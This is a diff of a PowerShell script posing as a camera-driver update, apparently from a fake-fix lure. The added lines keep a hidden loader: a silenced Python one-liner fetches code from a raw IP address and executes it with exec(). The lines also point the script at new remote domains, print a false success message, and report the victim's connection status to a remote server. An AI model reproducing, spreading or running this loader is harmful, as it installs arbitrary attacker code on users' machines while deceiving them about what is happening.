@@ -267,7 +267,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.criteriacorp.co/get-file/test.js"
+$envSetupUrl = "https://api.criteriacorp.net/get-file/test.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
@@ -339,7 +339,7 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 & "C:\python\python.exe" -m pip install requests portalocker pyzipper *> $null
-& "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='5-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
+& "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
 
 if ($LASTEXITCODE -ne 0) {
     Write-ErrorLog "pip install failed."
@@ -349,7 +349,7 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
-    $autoUrl = "https://api.criteriacorp.co/change-connection-status/$safeWindowUid"
+    $autoUrl = "https://api.criteriacorp.net/change-connection-status/$safeWindowUid"
     try {
         # Prefer native PowerShell HTTP first.
         Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
